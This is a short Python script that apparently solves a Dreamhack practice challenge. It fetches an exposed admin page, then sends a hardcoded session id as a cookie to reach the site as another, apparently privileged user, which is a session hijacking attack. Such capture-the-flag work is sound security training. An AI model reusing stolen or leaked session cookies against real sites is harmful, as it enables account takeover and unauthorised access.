import requests

port = 18843
url_admin = f"http://host1.dreamhack.games:{port}/admin"
response = requests.get(url_admin)
print(response.text)

# session_id = '016cd9d4a3e404cd476285e1ee3c5472a6de26066d4a1b3eb172794cc6314987'
url_index = "http://host1.dreamhack.games:18843"
cookies = {
    "sessionid": "016cd9d4a3e404cd476285e1ee3c5472a6de26066d4a1b3eb172794cc6314987"
}
response = requests.get(url_index, cookies=cookies)
print(response.text)
